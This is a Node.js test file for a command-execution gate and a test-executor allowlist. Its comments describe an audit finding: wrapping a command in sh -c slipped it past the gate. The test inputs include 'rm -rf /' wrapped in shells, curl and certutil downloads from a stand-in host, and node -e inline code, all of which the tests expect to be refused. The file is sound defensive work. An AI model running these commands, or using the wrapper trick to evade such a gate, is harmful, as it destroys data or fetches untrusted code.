'use strict';

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');

const { TEST_REFUSALS, runDeclaredTest } = require('../lib/coder/test-execution');
const { evaluateCommandExec, COMMAND_EXEC_DECISIONS } = require('../lib/command-exec-gate');

// #4073 (audit F-2, critical, pinned 2bda9f7c): the declared-test executor
// claimed a shell-free spawn but handed the caller-controlled tokens[0]
// straight to spawn, so `sh` in that slot ran the real /bin/sh with the rest
// of the command as its argument vector.
//
// The gate cannot see this. It reads the command as text, and
// `sh -c 'echo SHELL_RAN'` is a benign command as text -- the audit measured
// the gate returning ALLOW for it. So the executable has to be checked where
// the spawn happens, or the caller's choice of argv[0] decides which program
// runs.
//
// The gate side of the same audit (F-1, #4072) is PR #4080. It closes the
// destructive-payload half of the wrapper gap; it cannot close this half,
// because the gate never had the executable to look at.

function fakeSpawn(responses) {
  const calls = [];
  const spawn = (file, args, options) => {
    calls.push({ file, args, options });
    return responses[calls.length - 1] || { status: 0 };
  };
  spawn.calls = calls;
  return spawn;
}

describe('declared test executable allowlist (#4073)', () => {
  it('refuses a shell interpreter in argv[0] even when the gate allows the command', () => {
    const spawn = fakeSpawn([]);
    const command = "sh -c 'echo SHELL_RAN'";

    // The gate's own verdict, so the test states the whole point: the gate
    // allows this text, so only the executor can stop it.
    assert.equal(evaluateCommandExec({ command }).decision, COMMAND_EXEC_DECISIONS.ALLOW);

    const result = runDeclaredTest({ test: { command }, root: '.', spawn });

    assert.equal(result.ran, false);
    assert.equal(result.reason, TEST_REFUSALS.TEST_EXECUTABLE_IS_INTERPRETER);
    assert.equal(spawn.calls.length, 0);
  });

  it('refuses every shell the audit named, on a command the gate allows', () => {
    const commands = [
      'sh -c echo',
      'bash -c echo',
      'dash -c echo',
      'zsh -c echo',
      'cmd /c dir',
      'powershell -Command Get-ChildItem',
      'pwsh -Command Get-ChildItem',
    ];

    for (const command of commands) {
      const spawn = fakeSpawn([]);
      const result = runDeclaredTest({ test: { command }, root: '.', spawn });
      assert.equal(result.ran, false, `${command} ran`);
      assert.equal(result.reason, TEST_REFUSALS.TEST_EXECUTABLE_IS_INTERPRETER, command);
      assert.equal(spawn.calls.length, 0, `${command} spawned`);
    }
  });

  it('never runs a destructive payload wrapped in a shell interpreter', () => {
    // Whether this is refused by the gate (once #4080 unwraps the payload)
    // or by the executor's interpreter refusal, it must not run. The
    // property under test is that it never runs, not which layer says so.
    for (const command of ["sh -c 'rm -rf /'", "bash -lc 'rm -rf /'"]) {
      const spawn = fakeSpawn([]);
      const result = runDeclaredTest({ test: { command }, root: '.', spawn });
      assert.equal(result.ran, false, `${command} ran`);
      assert.equal(spawn.calls.length, 0, `${command} spawned`);
      assert.ok(
        result.reason === TEST_REFUSALS.GATE_BLOCKED
          || result.reason === TEST_REFUSALS.TEST_EXECUTABLE_IS_INTERPRETER,
        `${command} refused with ${result.reason}`,
      );
    }
  });

  it('refuses a program that is not a declared test executable', () => {
    // The allowlist is not only about shells: the gate allows a downloader
    // just as happily, and argv[0] must not be the caller's to choose.
    for (const command of ['curl http://example.invalid/x -o x', 'certutil -urlcache -split -f x http://example.invalid/x']) {
      const spawn = fakeSpawn([]);
      const result = runDeclaredTest({ test: { command }, root: '.', spawn });
      assert.equal(result.ran, false, `${command} ran`);
      assert.equal(result.reason, TEST_REFUSALS.TEST_EXECUTABLE_NOT_ALLOWED, command);
      assert.equal(spawn.calls.length, 0, `${command} spawned`);
    }
  });

  it('refuses a path that merely ends in an allowed name', () => {
    // The comparison is on the exact string, so a caller's own copy of a
    // program called node.exe is not the declared test executable.
    const spawn = fakeSpawn([]);
    const result = runDeclaredTest({ test: { command: 'C:\\temp\\node.exe --test test/x.js' }, root: '.', spawn });

    assert.equal(result.ran, false);
    assert.equal(result.reason, TEST_REFUSALS.TEST_EXECUTABLE_NOT_ALLOWED);
    assert.equal(spawn.calls.length, 0);
  });

  it('refuses an allowed executable that is handed code to evaluate', () => {
    for (const command of ["node -e 'require(\"child_process\")'", 'node --eval=require("child_process")', 'node -p 1+1']) {
      const spawn = fakeSpawn([]);
      const result = runDeclaredTest({ test: { command }, root: '.', spawn });
      assert.equal(result.ran, false, `${command} ran`);
      assert.equal(result.reason, TEST_REFUSALS.TEST_COMMAND_INLINE_CODE, command);
      assert.equal(spawn.calls.length, 0, `${command} spawned`);
    }
  });

  it('still runs the declared test executable', () => {
    const spawn = fakeSpawn([{ status: 0 }]);
    const result = runDeclaredTest({ test: { command: 'node --test test/x.js' }, root: '.', spawn });

    assert.equal(result.ran, true);
    assert.equal(result.ok, true);
    assert.equal(spawn.calls.length, 1);
    assert.equal(spawn.calls[0].file, 'node');
    assert.deepEqual(spawn.calls[0].args, ['--test', 'test/x.js']);
  });

  it('keeps the gate ahead of the executable check', () => {
    // The gate still decides the command as text: a denylisted command is
    // GATE_BLOCKED and a shell-metacharacter one is GATE_REVIEW, whatever
    // the executable would have been.
    const blocked = runDeclaredTest({ test: { command: 'rm -rf /' }, root: '.', spawn: fakeSpawn([]) });
    assert.equal(blocked.reason, TEST_REFUSALS.GATE_BLOCKED);

    const review = runDeclaredTest({ test: { command: 'node a.js && node b.js' }, root: '.', spawn: fakeSpawn([]) });
    assert.equal(review.reason, TEST_REFUSALS.GATE_REVIEW);
  });
});
